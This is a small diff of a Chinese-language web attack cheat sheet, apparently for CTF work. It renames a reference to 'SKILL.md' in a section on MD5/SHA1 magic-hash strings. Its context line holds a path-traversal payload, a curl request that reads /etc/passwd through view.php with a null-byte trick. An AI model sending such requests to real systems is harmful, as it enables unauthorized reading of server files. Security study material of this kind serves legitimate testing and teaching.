@@ -263,7 +263,7 @@ curl "$TARGET/view.php?page=0../../../etc/passwd%00"
 
 ## Magic Hash 扩展
 
-SKILL.md 已列出常用 MD5/SHA1 magic strings，以下补充特殊场景。
+main document 已列出常用 MD5/SHA1 magic strings，以下补充特殊场景。
 
 ### 双重 MD5 — `md5(md5($input))`
 
